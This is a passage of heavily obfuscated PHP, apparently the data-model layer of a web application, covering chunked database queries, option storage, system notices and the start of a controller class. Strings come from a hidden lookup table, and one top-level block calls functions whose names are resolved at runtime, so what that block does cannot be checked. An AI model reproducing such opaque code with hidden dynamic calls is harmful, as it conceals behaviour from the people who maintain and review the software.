$Eø¢“ãøÓ = array(), $BÈÀ²ŒšÓÊ = false) { goto BÖ–†¯Ö”¡; Déà±Ú·ô: if (method_exists($this->db, $dß‹©ˆ…‰È[268])) { for ($E“‡ËÚ‰ö˜ = 0; $E“‡ËÚ‰ö˜ < count($DÂ…¤•Úª‹); $E“‡ËÚ‰ö˜ += $Bë“ö¼‚â) { $Aõ´ óåö˜ = array_slice($DÂ…¤•Úª‹, $E“‡ËÚ‰ö˜, $Bë“ö¼‚â); if (!is_array($Aõ´ óåö˜) || count($Aõ´ óåö˜) == 0) { break; } $BÖïÂÚéñ® = $this->db->insertAll($Aõ´ óåö˜, $Eø¢“ãøÓ, $BÈÀ²ŒšÓÊ); $this->chunkEventCheck(count($Aõ´ óåö˜)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($DÂ…¤•Úª‹ as $d§âí‰‚‹ => $B˜àİõ«Ø») { $BÖïÂÚéñ® = $this->db->insert($B˜àİõ«Ø», $Eø¢“ãøÓ, $BÈÀ²ŒšÓÊ); } $this->commit(); } if (!1 !== $BÖïÂÚéñ®) { $DÑµŸÊ– = $this->getLastInsID(); if ($DÑµŸÊ–) { return $DÑµŸÊ–; } } return $BÖïÂÚéñ®; goto F‰‰·¼©; BÖ–†¯Ö”¡: $dß‹©ˆ…‰È =& $_SERVER[…ë˜õ]; ignore_timeout(); $Bë“ö¼‚â = self::SQL_WHERE_IN_CHUNK; goto fğõØëØˆË; fğõØëØˆË: if (empty($DÂ…¤•Úª‹)) { $this->error = think_lang($dß‹©ˆ…‰È[267]); return !1; } $Eø¢“ãøÓ = $this->_parseOptions($Eø¢“ãøÓ); foreach ($DÂ…¤•Úª‹ as $d§âí‰‚‹ => $B˜àİõ«Ø») { $DÂ…¤•Úª‹[$d§âí‰‚‹] = $this->_facade($B˜àİõ«Ø»); $this->_beforeInsert($DÂ…¤•Úª‹[$d§âí‰‚‹], $Eø¢“ãøÓ); } goto Déà±Ú·ô; F‰‰·¼©: } public function save($fªŠ¶µí’ = '', $c·ÓÚ¨Œ“÷ = array()) { goto dš¿¸¸í’·; E±Ÿö­¶ˆ: for ($cìİòŸ„“® = 0; $cìİòŸ„“® < $aßàãêšÜ; $cìİòŸ„“® += $DÁº¬¦­İœ) { $E«ø©é±÷ƒ = array_slice($Cé·ˆ¢‘Ã¤, $cìİòŸ„“®, $DÁº¬¦­İœ); if (!is_array($E«ø©é±÷ƒ) || count($E«ø©é±÷ƒ) == 0) { break; } $EŞõŒˆæŠ˜[$aŞ†ØñÖ[271]][$A­ø…ßÖ•][1] = $E«ø©é±÷ƒ; $this->optionsValue($EŞõŒˆæŠ˜); $b…à™êš» += parent::save($fªŠ¶µí’, $c·ÓÚ¨Œ“÷); $this->chunkEventCheck(count($E«ø©é±÷ƒ)); } $this->chunkEventSet(); return $b…à™êš»; goto C¶İóñë; dš¿¸¸í’·: $aŞ†ØñÖ =& $_SERVER[…ë˜õ]; $DÁº¬¦­İœ = self::SQL_WHERE_IN_CHUNK; $EŞõŒˆæŠ˜ = $this->optionsValue(); goto eŠèÆ’½Ã; Eğ‹ò«šæù: $Cé·ˆ¢‘Ã¤ = $EŞõŒˆæŠ˜[$aŞ†ØñÖ[271]][$A­ø…ßÖ•][1]; $Cé·ˆ¢‘Ã¤ = is_array($Cé·ˆ¢‘Ã¤) ? $Cé·ˆ¢‘Ã¤ : array(); $aßàãêšÜ = count($Cé·ˆ¢‘Ã¤); goto E±Ÿö­¶ˆ; eŠèÆ’½Ã: $A­ø…ßÖ• = $this->findWhereField($EŞõŒˆæŠ˜); if (!$A­ø…ßÖ•) { return parent::save($fªŠ¶µí’, $c·ÓÚ¨Œ“÷); } $b…à™êš» = 0; goto Eğ‹ò«šæù; C¶İóñë: } public function add($BÕãª”å¥¬ = '', $B ³±ç•’ = array(), $Aô‹½Ë±¸ = false) { if ($this->addTaskStatus && is_array($BÕãª”å¥¬)) { $this->addTaskData[] = $BÕãª”å¥¬; return; } return parent::add($BÕãª”å¥¬, $B ³±ç•’, $Aô‹½Ë±¸); } public function parseWhereLike($aá¤¶«¾Æ, $F¬ÖÏŞÛ = '', $A®âÄ¬‘¤£ = false, &$FÅÑáÊ¦º» = false) { goto A¿å‰èæ‘â; aËô±‹¡Á: if (!is_array($aá¤¶«¾Æ)) { return $aá¤¶«¾Æ; } $B²ºÜßôŠâ = array(); $D¬İŞ´¸µª = 0; goto aÁ³†­È; A¿å‰èæ‘â: $cÙİ¼Ôíù =& $_SERVER[…ë˜õ]; $F·é¼æ‰‹ø = $GLOBALS[$cÙİ¼Ôíù[6]][$cÙİ¼Ôíù[376]]; if (!$F·é¼æ‰‹ø[$cÙİ¼Ôíù[377]]) { return $aá¤¶«¾Æ; } goto aËô±‹¡Á; aÁ³†­È: foreach ($aá¤¶«¾Æ as $EàéÕ©Ÿê => $ašÜ‘Ïø×¼) { if (is_array($ašÜ‘Ïø×¼) && count($ašÜ‘Ïø×¼) == 2 && $ašÜ‘Ïø×¼[0] == $cÙİ¼Ôíù[378] && is_string($ašÜ‘Ïø×¼[1]) && substr($ašÜ‘Ïø×¼[1], 0, 1) == $cÙİ¼Ôíù[379] && substr($ašÜ‘Ïø×¼[1], strlen($ašÜ‘Ïø×¼[1]) - 1, 1) == $cÙİ¼Ôíù[379]) { goto Dó£ì×Ú¨; c¸¬İ“™é: $B²ºÜßôŠâ[$D¬İŞ´¸µª] = $cÙİ¼Ôíù[382] . $e¨‡Ñ¡„§â . $cÙİ¼Ôíù[383] . $b¨ Ğ¦²ù . $cÙİ¼Ôíù[384]; $D¬İŞ´¸µª++; continue; goto dÒõ¤’‡íæ; Dó£ì×Ú¨: $FÅÑáÊ¦º» = !0; $e¨‡Ñ¡„§â = is_string($EàéÕ©Ÿê) ? $EàéÕ©Ÿê : $F¬ÖÏŞÛ; $b¨ Ğ¦²ù = substr($ašÜ‘Ïø×¼[1], 1, strlen($ašÜ‘Ïø×¼[1]) - 2); goto A„ß‚¼²êÌ; A„ß‚¼²êÌ: $b¨ Ğ¦²ù = $this->db->escapeString($b¨ Ğ¦²ù); if (!strpos($e¨‡Ñ¡„§â, $cÙİ¼Ôíù[94])) { $e¨‡Ñ¡„§â = $cÙİ¼Ôíù[380] . $e¨‡Ñ¡„§â . $cÙİ¼Ôíù[380]; } if ($F·é¼æ‰‹ø[$cÙİ¼Ôíù[381]]) { $b¨ Ğ¦²ù = $cÙİ¼Ôíù[115] . $b¨ Ğ¦²ù . $cÙİ¼Ôíù[115]; } goto c¸¬İ“™é; dÒõ¤’‡íæ: } if (is_array($ašÜ‘Ïø×¼)) { $F¬ÖÏŞÛ = is_string($EàéÕ©Ÿê) ? $EàéÕ©Ÿê : $F¬ÖÏŞÛ; $ašÜ‘Ïø×¼ = $this->parseWhereLike($ašÜ‘Ïø×¼, $F¬ÖÏŞÛ, !0, $FÅÑáÊ¦º»); } if (is_numeric($EàéÕ©Ÿê)) { $B²ºÜßôŠâ[$D¬İŞ´¸µª] = $ašÜ‘Ïø×¼; $D¬İŞ´¸µª++; } else { $B²ºÜßôŠâ[$EàéÕ©Ÿê] = $ašÜ‘Ïø×¼; } } if ($FÅÑáÊ¦º» && !$A®âÄ¬‘¤£) { trace_log(array($B²ºÜßôŠâ, $aá¤¶«¾Æ), $cÙİ¼Ôíù[271]); } return $B²ºÜßôŠâ; goto C³†Ê¦¯‡á; C³†Ê¦¯‡á: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($B¼§ŞğÊ… = array()) { goto AÎ‹Ö°Ş‘; E­÷¨šŒãº: return $F›œŠàéÓ; goto D«èÕ£µ©; d©ÀŠ¿òÛ: $D×…ãŞô¾… = is_array($D×…ãŞô¾…) ? $D×…ãŞô¾… : array(); $F›œŠàéÓ = null; for ($C†íØÌÀñ = 0; $C†íØÌÀñ < count($D×…ãŞô¾…); $C†íØÌÀñ += $E÷¢¼ê÷Úğ) { $fÔ×‘ŸÛ÷Õ = array_slice($D×…ãŞô¾…, $C†íØÌÀñ, $E÷¢¼ê÷Úğ); if (!is_array($fÔ×‘ŸÛ÷Õ) || count($fÔ×‘ŸÛ÷Õ) == 0) { break; } $Dè®Á­‘¢ª[$EàåàÌ„[271]][$C´½ŠÄ–áÏ][1] = $fÔ×‘ŸÛ÷Õ; $this->optionsValue($Dè®Á­‘¢ª); $F¤ôøñ¦ô = parent::select($B¼§ŞğÊ…); if (!$F¤ôøñ¦ô) { continue; } $F›œŠàéÓ = is_array($F›œŠàéÓ) ? $F›œŠàéÓ : array(); $F›œŠàéÓ = array_merge($F›œŠàéÓ, $F¤ôøñ¦ô); } goto E­÷¨šŒãº; AÎ‹Ö°Ş‘: $EàåàÌ„ =& $_SERVER[…ë˜õ]; $E÷¢¼ê÷Úğ = self::SQL_WHERE_IN_CHUNK; $Dè®Á­‘¢ª = $this->optionsValue(); goto c³¢ßÃ„ÕÄ; c³¢ßÃ„ÕÄ: $C´½ŠÄ–áÏ = $this->findWhereField($Dè®Á­‘¢ª); if (!$C´½ŠÄ–áÏ || isset($Dè®Á­‘¢ª[$EàåàÌ„[288]]) || isset($Dè®Á­‘¢ª[$EàåàÌ„[349]])) { return parent::select($B¼§ŞğÊ…); } $D×…ãŞô¾… = $Dè®Á­‘¢ª[$EàåàÌ„[271]][$C´½ŠÄ–áÏ][1]; goto d©ÀŠ¿òÛ; D«èÕ£µ©: } public function delete($e”Î†´…˜Å = array()) { goto eÁ¨à²®; eÁ¨à²®: $DµÂŠ…¡¤ê =& $_SERVER[…ë˜õ]; $F†ŠÙÛÒˆ« = self::SQL_WHERE_IN_CHUNK; $cÆ  Â¢Í‚ = $this->optionsValue(); goto fŞ—›ˆ·Ç‹; d“±­«Ğ¨‹: $FøÃˆšçë÷ = $cÆ  Â¢Í‚[$DµÂŠ…¡¤ê[271]][$C¬¹é‹ôÎ™][1]; $FøÃˆšçë÷ = is_array($FøÃˆšçë÷) ? $FøÃˆšçë÷ : array(); for ($eäœÓ»ï = 0; $eäœÓ»ï < count($FøÃˆšçë÷); $eäœÓ»ï += $F†ŠÙÛÒˆ«) { $Fé®¯öõ… = array_slice($FøÃˆšçë÷, $eäœÓ»ï, $F†ŠÙÛÒˆ«); if (!is_array($Fé®¯öõ…) || count($Fé®¯öõ…) == 0) { break; } $cÆ  Â¢Í‚[$DµÂŠ…¡¤ê[271]][$C¬¹é‹ôÎ™][1] = $Fé®¯öõ…; $this->optionsValue($cÆ  Â¢Í‚); $a‚ğ„ÆŞĞ += parent::delete($e”Î†´…˜Å); } goto fê§ğç³…•; fŞ—›ˆ·Ç‹: $C¬¹é‹ôÎ™ = $this->findWhereField($cÆ  Â¢Í‚); if (!$C¬¹é‹ôÎ™) { return parent::delete($e”Î†´…˜Å); } $a‚ğ„ÆŞĞ = 0; goto d“±­«Ğ¨‹; fê§ğç³…•: return $a‚ğ„ÆŞĞ; goto bºÓÇùÆÙä; bºÓÇùÆÙä: } private function findWhereField($D†ÓÓŠô‹¯) { $F÷ÓÓ²†„‘ =& $_SERVER[…ë˜õ]; $e•Ò¢®¡«ñ = self::SQL_WHERE_IN_CHUNK; if (!is_array($D†ÓÓŠô‹¯) || !is_array($D†ÓÓŠô‹¯[$F÷ÓÓ²†„‘[271]])) { return !1; } foreach ($D†ÓÓŠô‹¯[$F÷ÓÓ²†„‘[271]] as $eĞñÀšõù‚ => $BíÊ÷¾äÖ) { if (is_array($BíÊ÷¾äÖ) && isset($BíÊ÷¾äÖ[0]) && is_string($BíÊ÷¾äÖ[0]) && strtolower($BíÊ÷¾äÖ[0]) == $F÷ÓÓ²†„‘[7] && is_array($BíÊ÷¾äÖ[1]) && count($BíÊ÷¾äÖ[1]) > $e•Ò¢®¡«ñ) { ignore_timeout(); return $eĞñÀšõù‚; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\155\x4f\x70\164\151\157\156"; public $field = array(); public function listData($FéŒ—¡“«Œ = false, $c‹›´°¸³ = "\x6d\x6f\x64\x69\146\171\124\151\155\x65", $f‹‹šÜöá  = false) { $c¡Ò ÎÍÈá = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$c¡Ò ÎÍÈá) { return $FéŒ—¡“«Œ ? null : array(); } if (!$FéŒ—¡“«Œ) { $c¡Ò ÎÍÈá = array_filter(array_values($c¡Ò ÎÍÈá)); return array_sort_by($c¡Ò ÎÍÈá, $c‹›´°¸³, $f‹‹šÜöá ); } return $c¡Ò ÎÍÈá[$_SERVER[…ë˜õ][385] . $FéŒ—¡“«Œ]; } public function insert($E‚…ŠÈ) { goto bÕë¹±‚¯«; AÉ¬Î»ÚôŒ: $E‚…ŠÈ[$B÷¿§ôº…‘[83]] = time(); Model($this->modelType)->set($B÷¿§ôº…‘[386], $AôÕ…ÁƒŸí, $this->optionType . $B÷¿§ôº…‘[387]); Model($this->modelType)->set($B÷¿§ôº…‘[385] . $AôÕ…ÁƒŸí, $E‚…ŠÈ, $this->optionType); goto a¤ŒÁ—í±Á; eô÷âôÉ…À: $AôÕ…ÁƒŸí = $AôÕ…ÁƒŸí ? $AôÕ…ÁƒŸí : 0; $E‚…ŠÈ[$B÷¿§ôº…‘[388]] = ++$AôÕ…ÁƒŸí; $E‚…ŠÈ[$B÷¿§ôº…‘[192]] = time(); goto AÉ¬Î»ÚôŒ; bÕë¹±‚¯«: $B÷¿§ôº…‘ =& $_SERVER[…ë˜õ]; $E‚…ŠÈ = array_field_key($E‚…ŠÈ, $this->field); $AôÕ…ÁƒŸí = Model($this->modelType)->get($B÷¿§ôº…‘[386], $this->optionType . $B÷¿§ôº…‘[387]); goto eô÷âôÉ…À; a¤ŒÁ—í±Á: return $AôÕ…ÁƒŸí; goto C„Ø£§¡ã²; C„Ø£§¡ã²: } public function update($F˜–ƒƒ•ãá, $d¼š—Úôˆí) { goto Dèâ‹ÏÕˆÁ; Dèâ‹ÏÕˆÁ: $E¤¿¡™ Éæ =& $_SERVER[…ë˜õ]; $d¼š—Úôˆí = array_field_key($d¼š—Úôˆí, $this->field); $C—ëÄÃÍÁ = $this->listData($F˜–ƒƒ•ãá); goto eÉñ«Øœ¥¥; eÉñ«Øœ¥¥: if (!$C—ëÄÃÍÁ) { return !1; } $d¼š—Úôˆí = array_merge($C—ëÄÃÍÁ, $d¼š—Úôˆí); $d¼š—Úôˆí[$E¤¿¡™ Éæ[83]] = time(); goto a‚Ü‚»£»×; a‚Ü‚»£»×: return Model($this->modelType)->set($E¤¿¡™ Éæ[385] . $F˜–ƒƒ•ãá, $d¼š—Úôˆí, $this->optionType); goto e¾›ØÚæŞŞ; e¾›ØÚæŞŞ: } public function remove($c®¡°‹»æ) { return Model($this->modelType)->remove($_SERVER[…ë˜õ][385] . $c®¡°‹»æ, $this->optionType); } public function clear() { $B½‘‡†Â¹¿ =& $_SERVER[…ë˜õ]; Model($this->modelType)->remove($B½‘‡†Â¹¿[386], $this->optionType . $B½‘‡†Â¹¿[387]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($aÏ±Ò±Ğç±, $Cš® çÑ‚) { if (!$Cš® çÑ‚) { return !1; } $D×´‰¦õïø = $this->listData(); $D×´‰¦õïø = array_to_keyvalue($D×´‰¦õïø, $aÏ±Ò±Ğç±); return isset($D×´‰¦õïø[$Cš® çÑ‚]) ? $D×´‰¦õïø[$Cš® çÑ‚] : !1; } public function findByName($eÓé½˜ÑÙæ) { return $this->findByKey($_SERVER[…ë˜õ][28], $eÓé½˜ÑÙæ); } protected function resetData($aºÁÑîŸÛ¬) { $a¹¯®†‡‘› =& $_SERVER[…ë˜õ]; $aºÁÑîŸÛ¬ = is_array($aºÁÑîŸÛ¬) ? $aºÁÑîŸÛ¬ : array(); $DŠƒÁ Íğ = array(); for ($A¿…Ÿ™ëèÇ = 0; $A¿…Ÿ™ëèÇ < count($aºÁÑîŸÛ¬); $A¿…Ÿ™ëèÇ++) { $DŠƒÁ Íğ[$a¹¯®†‡‘›[385] . $aºÁÑîŸÛ¬[$A¿…Ÿ™ëèÇ][$a¹¯®†‡‘›[388]]] = $aºÁÑîŸÛ¬[$A¿…Ÿ™ëèÇ]; } return Model($this->modelType)->set($DŠƒÁ Íğ, !1, $this->optionType); } private function getAutoName($E…’ÚåĞô) { $AŒ„Ô”İ¶š = array_to_keyvalue($this->listData(), $_SERVER[…ë˜õ][28]); if (!$AŒ„Ô”İ¶š || !isset($AŒ„Ô”İ¶š[$E…’ÚåĞô])) { return $E…’ÚåĞô; } for ($A˜©Åƒ·Ÿ† = 1; $A˜©Åƒ·Ÿ† < count($AŒ„Ô”İ¶š); $A˜©Åƒ·Ÿ†++) { $d¬ØŠ©Ñ³ = $E…’ÚåĞô . "\50{$A˜©Åƒ·Ÿ†}\51"; if (!isset($AŒ„Ô”İ¶š[$d¬ØŠ©Ñ³])) { return $d¬ØŠ©Ñ³; } } return $d¬ØŠ©Ñ³; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Bæ÷Š°—’É = false, $aß³ŒŒ§Ê• = '', $aæÌ¨“„ÊÇ = false) { goto C†Œ¦†¸³; f®Šßã‚°: $AêèèÒ†ğ‡ = is_array($AêèèÒ†ğ‡) ? $AêèèÒ†ğ‡ : array(); if (is_array($e¶‹µè®‰Æ)) { $e¶‹µè®‰Æ = array_merge($AêèèÒ†ğ‡, $e¶‹µè®‰Æ); return $Bæ÷Š°—’É ? isset($e¶‹µè®‰Æ[$Bæ÷Š°—’É]) ? $e¶‹µè®‰Æ[$Bæ÷Š°—’É] : null : $e¶‹µè®‰Æ; } $DŠó»”ß¶ = $this->filterWhere(array($D¶¿›î²œô[29] => $aß³ŒŒ§Ê•)); goto eÙ„ÆÄ½ñÏ; eÙ„ÆÄ½ñÏ: $e¶‹µè®‰Æ = $this->where($DŠó»”ß¶)->select(); $e¶‹µè®‰Æ = array_to_keyvalue($e¶‹µè®‰Æ, $D¶¿›î²œô[92], $D¶¿›î²œô[370]); foreach ($e¶‹µè®‰Æ as $Câ¯£„÷–¬ => $aŠÜ‡·¯õ) { if ($aæÌ¨“„ÊÇ || in_array($Câ¯£„÷–¬, $this->jsonField)) { $e¶‹µè®‰Æ[$Câ¯£„÷–¬] = json_decode($aŠÜ‡·¯õ, !0); } } goto dĞáçÇ¦; C†Œ¦†¸³: $D¶¿›î²œô =& $_SERVER[…ë˜õ]; $e¶‹µè®‰Æ = $this->cacheGet($aß³ŒŒ§Ê•); $AêèèÒ†ğ‡ = $this->optionDefault($aß³ŒŒ§Ê•); goto f®Šßã‚°; dĞáçÇ¦: $this->cacheSet($aß³ŒŒ§Ê•, $e¶‹µè®‰Æ); $e¶‹µè®‰Æ = array_merge($AêèèÒ†ğ‡, $e¶‹µè®‰Æ); return $Bæ÷Š°—’É ? $e¶‹µè®‰Æ[$Bæ÷Š°—’É] : $e¶‹µè®‰Æ; goto bÙ¢»™†‡í; bÙ¢»™†‡í: } public function set($cù—°àÅ, $aÒ¬»œøß = false, $Eõ”¨š»¬ = '') { goto fÆ¹ïŸ»ŞÜ; a¥é©ÚËêŠ: $e¢‚Ã“ÚÑ– = is_array($cù—°àÅ) ? $cù—°àÅ : array($cù—°àÅ => $aÒ¬»œøß); foreach ($e¢‚Ã“ÚÑ– as $FÃç—½ => $cê«¥×±°³) { if (is_array($cê«¥×±°³)) { $cê«¥×±°³ = json_encode_force($cê«¥×±°³); } $this->checkLength($cê«¥×±°³, !1, $this->tableName . $dÒ¿–¹Ãùø[4] . $cù—°àÅ); $cê«¥×±°³ = self::textEncode($cê«¥×±°³); $e¢‚Ã“ÚÑ– = array($dÒ¿–¹Ãùø[29] => $Eõ”¨š»¬, $dÒ¿–¹Ãùø[92] => $FÃç—½, $dÒ¿–¹Ãùø[370] => $cê«¥×±°³); $EÒøğ‚ÜÎ[] = $this->filterWhere($e¢‚Ã“ÚÑ–); } if (!$EÒøğ‚ÜÎ) { return !0; } goto EˆÜ›Ôˆö; fÆ¹ïŸ»ŞÜ: $dÒ¿–¹Ãùø =& $_SERVER[…ë˜õ]; $this->cacheRemove($Eõ”¨š»¬); $EÒøğ‚ÜÎ = array(); goto a¥é©ÚËêŠ; EˆÜ›Ôˆö: return $this->addAll($EÒøğ‚ÜÎ, array(), !0); goto AëïÈµç«; AëïÈµç«: } protected function optionDefault($FÖò¤Ï¯ëÓ = '') { return !1; } public function setDeep($e­–ˆ‘Ì“, $EÁ‘ÆöæšÀ = false, $Eè¯ä±©’‚ = '') { $bŸïİ©‚½ = explode($_SERVER[…ë˜õ][94], $e­–ˆ‘Ì“); $f”Š†ëâÏª = $this->get(); array_set_value($f”Š†ëâÏª, $e­–ˆ‘Ì“, $EÁ‘ÆöæšÀ); $this->set($bŸïİ©‚½[0], $f”Š†ëâÏª[$bŸïİ©‚½[0]], $Eè¯ä±©’‚); } public function remove($CÖâÇ¯—Ğ, $c‰ö‡”§Ê¨ = '') { $E™¯Î‘ºì¢ =& $_SERVER[…ë˜õ]; $this->cacheRemove($c‰ö‡”§Ê¨); $CòçÉßËÙ = $this->filterWhere(array($E™¯Î‘ºì¢[92] => $CÖâÇ¯—Ğ, $E™¯Î‘ºì¢[29] => $c‰ö‡”§Ê¨)); if (is_null($CÖâÇ¯—Ğ)) { unset($CòçÉßËÙ[$E™¯Î‘ºì¢[92]]); } return $this->where($CòçÉßËÙ)->delete(); } public function cacheSet($aÉ¢íù™ÊÆ, $BÆõ¼‰» = false) { return Cache::set($this->cacheKey($aÉ¢íù™ÊÆ), $BÆõ¼‰»); } public function cacheGet($BØ•Ä­È¼—) { return Cache::get($this->cacheKey($BØ•Ä­È¼—)); } public function cacheRemove($bæº‘µ¨¼ä) { return Cache::remove($this->cacheKey($bæº‘µ¨¼ä)); } protected function filterWhere($B÷æ·ÛÅì) { return $B÷æ·ÛÅì; } protected function cacheKey($EçÈ¿Å†Øœ) { return $EçÈ¿Å†Øœ; } } goto a¾¨‚á¼Ö; E×£Æ„İƒ: if ($_SERVER[$_SERVER[…ë˜õ][824]] != $_SERVER[$_SERVER[…ë˜õ][1530]]) { goto bÌçÅöÔÍ«; aßÊÓèÉ: $Bƒ‚¶¿ò¿ = explode($_SERVER[…ë˜õ][227], $cƒ³Šñï’); if (count($Bƒ‚¶¿ò¿) < $_SERVER[…ë˜õ][599]) { $Dàå³¦Œ½º = $_SERVER[…ë˜õ][829]; $Dàå³¦Œ½º(); } $Fº‚²¼Î„• = $_SERVER[…ë˜õ][830]; goto BŠ³¦©Íæœ; bÌçÅöÔÍ«: $EĞ—åèã÷î = $_SERVER[…ë˜õ][826]; $BÏØÒË­å— = $_SERVER[$_SERVER[…ë˜õ][827]] . $_SERVER[…ë˜õ][828]; $cƒ³Šñï’ = $EĞ—åèã÷î($BÏØÒË­å—); goto aßÊÓèÉ; BŠ³¦©Íæœ: $Fº‚²¼Î„•($_SERVER[$_SERVER[…ë˜õ][825]]); goto F„ÊçÌì‡; F„ÊçÌì‡: } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\x6e\x6f\x74\151\143\x65\114\x69\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x63\157\156\164\145\x6e\x74", "\141\165\x74\150", "\x6d\157\144\145", "\164\151\x6d\x65", "\x74\x79\x70\x65", "\x6c\145\x76\145\154", "\x65\x6e\141\x62\154\x65", "\x73\157\x72\164"); public function listData($e‰‰¸¨ = false, $e®ÈğŞÄ÷² = "\x73\157\x72\164", $eÉ¾Êˆƒ¶Å = false) { return parent::listData($e‰‰¸¨, $e®ÈğŞÄ÷², $eÉ¾Êˆƒ¶Å); } public function add($aî›öâöïÕ) { $A±¢ˆª“Ÿ =& $_SERVER[…ë˜õ]; $aÅ«îÆ©ˆ¿ = time(); if ($aî›öâöïÕ[$A±¢ˆª“Ÿ[12]] == $A±¢ˆª“Ÿ[2103]) { $aÅ«îÆ©ˆ¿ = strtotime($aî›öâöïÕ[$A±¢ˆª“Ÿ[195]]); } $aî›öâöïÕ[$A±¢ˆª“Ÿ[195]] = $aÅ«îÆ©ˆ¿; return parent::insert($aî›öâöïÕ); } public function update($eîÖçò¥“‘, $f×©ÍôŞ°í) { goto bò˜Í°Çæ‘; e©ÀİÊŸ®: $c’ßÉÂ³ = time(); if ($f×©ÍôŞ°í[$F¡Ï£·è“ó[12]] == $F¡Ï£·è“ó[2103]) { $c’ßÉÂ³ = strtotime($f×©ÍôŞ°í[$F¡Ï£·è“ó[195]]); } $f×©ÍôŞ°í[$F¡Ï£·è“ó[195]] = $c’ßÉÂ³; goto D“’•è—ÁŠ; bò˜Í°Çæ‘: $F¡Ï£·è“ó =& $_SERVER[…ë˜õ]; $d«å­‚µ‚ã = $this->listData($eîÖçò¥“‘); if (!$d«å­‚µ‚ã) { return !1; } goto e©ÀİÊŸ®; D“’•è—ÁŠ: return parent::update($eîÖçò¥“‘, $f×©ÍôŞ°í); goto fŸÎ‡³ëç; fŸÎ‡³ëç: } public function remove($cĞòã‰Ï¢Ù) { $Fø¿»ôÁŒç = $this->listData($cĞòã‰Ï¢Ù); if (!$Fø¿»ôÁŒç || $Fø¿»ôÁŒç[$_SERVER[…ë˜õ][1174]]) { return !1; } return parent::remove($cĞòã‰Ï¢Ù); } public function sort($fò÷£ÅÇ¦‚, $b‡ÍƒŞ¾°¿) { return parent::update($fò÷£ÅÇ¦‚, $b‡ÍƒŞ¾°¿); } public function enable($b·¦¼Œ˜×, $bÓ­·ëåÃİ) { return parent::update($b·¦¼Œ˜×, array($_SERVER[…ë˜õ][2104] => $bÓ­·ëåÃİ)); } private function initUserOption() { $a®Ú”Ò‘Ñ =& $_SERVER[…ë˜õ]; $this->optionType = $a®Ú”Ò‘Ñ[2105]; $this->modelType = $a®Ú”Ò‘Ñ[2106]; $this->field = array($a®Ú”Ò‘Ñ[2107], $a®Ú”Ò‘Ñ[28], $a®Ú”Ò‘Ñ[195], $a®Ú”Ò‘Ñ[29], $a®Ú”Ò‘Ñ[2108], $a®Ú”Ò‘Ñ[731], $a®Ú”Ò‘Ñ[188]); } public function userNoticeGet($cƒÀ¼ùˆËŠ = false) { $this->initUserOption(); return parent::listData($cƒÀ¼ùˆËŠ, $_SERVER[…ë˜õ][388], !0); } public function userNoticeAdd($b¢‹î‡©Ÿ’) { $F‰¸ˆù¨‹¾ =& $_SERVER[…ë˜õ]; $this->initUserOption(); $Aãï†—é ˆ = $this->findByKey($F‰¸ˆù¨‹¾[2107], $b¢‹î‡©Ÿ’[$F‰¸ˆù¨‹¾[388]]); if ($Aãï†—é ˆ) { return !0; } $d‡ğÄ ®•Ô = array($F‰¸ˆù¨‹¾[2107] => $b¢‹î‡©Ÿ’[$F‰¸ˆù¨‹¾[388]], $F‰¸ˆù¨‹¾[28] => $b¢‹î‡©Ÿ’[$F‰¸ˆù¨‹¾[28]], $F‰¸ˆù¨‹¾[195] => $b¢‹î‡©Ÿ’[$F‰¸ˆù¨‹¾[195]], $F‰¸ˆù¨‹¾[29] => isset($b¢‹î‡©Ÿ’[$F‰¸ˆù¨‹¾[29]]) ? $b¢‹î‡©Ÿ’[$F‰¸ˆù¨‹¾[29]] : 1, $F‰¸ˆù¨‹¾[2108] => isset($b¢‹î‡©Ÿ’[$F‰¸ˆù¨‹¾[2108]]) ? $b¢‹î‡©Ÿ’[$F‰¸ˆù¨‹¾[2108]] : 0, $F‰¸ˆù¨‹¾[731] => 0, $F‰¸ˆù¨‹¾[188] => 0); return parent::insert($d‡ğÄ ®•Ô); } public function userNoticeEdit($D¹»Å·®, $b ŠôËÙÌî) { $this->initUserOption(); return parent::update($D¹»Å·®, $b ŠôËÙÌî); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\145\x6d\x5f\157\x70\x74\151\x6f\156"; protected $jsonField = array("\155\145\x6e\165", "\162\157\x6c\145", "\x72\157\154\x65\107\162\x6f\x75\x70", "\x72\145\x67\151\x73\164", "\x65\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($DÜÊçÖµ¢ñ) { return "\123\171\x73\164\x65\155\x4f\x70\x74\x69\157\156\x5f{$DÜÊçÖµ¢ñ}"; } protected function optionDefault($DˆŸ·ó»  = '') { $B‰¬Û•„¾ƒ =& $_SERVER[…ë˜õ]; if ($DˆŸ·ó»  == $B‰¬Û•„¾ƒ[33]) { return $GLOBALS[$B‰¬Û•„¾ƒ[6]][$B‰¬Û•„¾ƒ[376]]; } } } goto c¯˜„œö¶; DßßÃÖ–“–: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto Cîë„…ß‘‘; Cîë„…ß‘‘: $báí °İˆ© =& $_SERVER[…ë˜õ]; global $in, $config; $this->config =& $config; goto EĞÌóïÙŞâ; EĞÌóïÙŞâ: $this->in =& $in; $this->values[$báí °İˆ©[6]] =& $config; $this->values[$báí °İˆ©[7]] =& $in; goto aª´™›¤×Ë; aª´™›¤×Ë: $this->tpl = TEMPLATE . MOD . $báí °İˆ©[8]; $this->_classObjectID = mt_rand(0, 10000); goto Eñ¸»…Œƒ; Eñ¸»…Œƒ: } public function loadClass($cÓ„Ì¤†¶Š) { if (1 === func_num_args()) { $this->{$cÓ„Ì¤†¶Š} = new $cÓ„Ì¤†¶Š(); } else { $a˜½ï‹×µê = new ReflectionClass($cÓ„Ì¤†¶Š); $càôÜšº‘à = func_get_args(); array_shift($càôÜšº‘à); $this->{$cÓ„Ì¤†¶Š} = 